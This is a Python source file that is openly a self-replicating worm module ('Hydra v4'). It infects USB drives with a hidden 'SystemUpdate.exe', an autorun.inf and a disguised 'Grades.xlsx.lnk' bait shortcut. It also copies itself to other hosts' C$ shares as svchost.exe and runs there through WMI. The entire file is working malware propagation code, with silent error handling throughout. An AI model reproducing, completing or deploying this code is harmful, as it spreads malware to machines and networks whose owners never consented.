"""
Hydra v4 — Self-replication module.
USB worm + network share scanning + LAN infection (WMI).
"""
import os
import sys
import time
import shutil
import subprocess
import threading
import ctypes
import string


def watch_usb(cfg: dict, me: dict):
    """Monitor for new USB drives and auto-infect."""
    infected_file = os.path.join(
        os.environ.get("TEMP", os.path.expanduser("~")),
        ".hydra_usb.txt"
    )
    seen = set()
    if os.path.exists(infected_file):
        try:
            with open(infected_file) as f:
                seen = set(line.strip() for line in f if line.strip())
        except:
            pass

    exe_path = _get_exe_path()

    while True:
        try:
            drives = _get_removable_drives()
            for drive in drives:
                if drive in seen:
                    continue
                seen.add(drive)

                try:
                    _infect_drive(drive, exe_path)
                except:
                    pass

                try:
                    with open(infected_file, "a") as f:
                        f.write(drive + "\n")
                except:
                    pass

        except:
            pass

        time.sleep(10)


def _infect_drive(drive: str, exe_path: str):
    """Plant payload on USB drive."""
    try:
        # Copy EXE (hidden)
        target_exe = os.path.join(drive, "SystemUpdate.exe")
        shutil.copy2(exe_path, target_exe)
        ctypes.windll.kernel32.SetFileAttributesW(target_exe,
            2 | 4)  # HIDDEN | SYSTEM

        # Create autorun.inf (hidden + system)
        autorun = os.path.join(drive, "autorun.inf")
        with open(autorun, "w") as f:
            f.write("[AutoRun]\n")
            f.write("open=SystemUpdate.exe --silent\n")
            f.write("action=Open folder to view files\n")
            f.write("icon=shell32.dll,4\n")
            ctypes.windll.kernel32.SetFileAttributesW(autorun,
                2 | 4)  # HIDDEN | SYSTEM

        # Create a legit-looking LNK shortcut as bait
        # Uses PowerShell to create the LNK
        ps_cmd = (
            f"$ws = New-Object -ComObject WScript.Shell; "
            f"$sc = $ws.CreateShortcut('{drive}\\\\Grades.xlsx.lnk'); "
            f"$sc.TargetPath = 'wscript.exe'; "
            f"$sc.Arguments = '//B \\\"{drive}\\\\SystemUpdate.exe\\\"'; "
            f"$sc.WindowStyle = 7; "
            f"$sc.IconLocation = 'C:\\\\Windows\\\\System32\\\\shell32.dll,1'; "
            f"$sc.Save()"
        )
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        subprocess.run(
            f'powershell -Command "{ps_cmd}"',
            shell=True, startupinfo=si,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            timeout=10
        )

    except:
        pass


def scan_shares(cfg: dict, me: dict):
    """Periodically scan for writeable network shares and drop payload."""
    exe_path = _get_exe_path()
    infected_hosts = set()

    while True:
        try:
            # Get list of network computers
            r = subprocess.run(
                "net view", shell=True,
                capture_output=True, text=True, timeout=15
            )
            for line in r.stdout.split("\n"):
                line = line.strip()
                if line.startswith("\\\\"):
                    host = line.split()[0]
                    if host in infected_hosts:
                        continue

                    # Try to drop via Admin$ or C$ shares
                    try:
                        target = f"{host}\\C$\\Users\\Public\\svchost.exe"
                        shutil.copy2(exe_path, target)
                        infected_hosts.add(host)

                        # Try to execute remotely via WMI
                        _remote_execute(host, target)
                    except:
                        pass

        except:
            pass

        time.sleep(300)  # Every 5 minutes


def _remote_execute(host: str, exe_path: str):
    """Try to execute payload on remote machine via WMI."""
    host_clean = host.replace("\\\\", "")
    try:
        cmd = (
            f'wmic /node:"{host_clean}" process call create '
            f'"{exe_path} --silent" 2>nul'
        )
        subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True, timeout=15
        )
    except:
        pass


def _get_removable_drives() -> list:
    """Get list of removable drive letters."""
    drives = []
    try:
        import ctypes
        mask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if mask & (1 << (ord(letter) - ord('A'))):
                path = f"{letter}:\\"
                drive_type = ctypes.windll.kernel32.GetDriveTypeW(path)
                if drive_type == 2:  # DRIVE_REMOVABLE
                    drives.append(path)
    except:
        pass
    return drives


def _get_exe_path() -> str:
    """Get the path to our executable."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(sys.argv[0] if sys.argv else __file__)
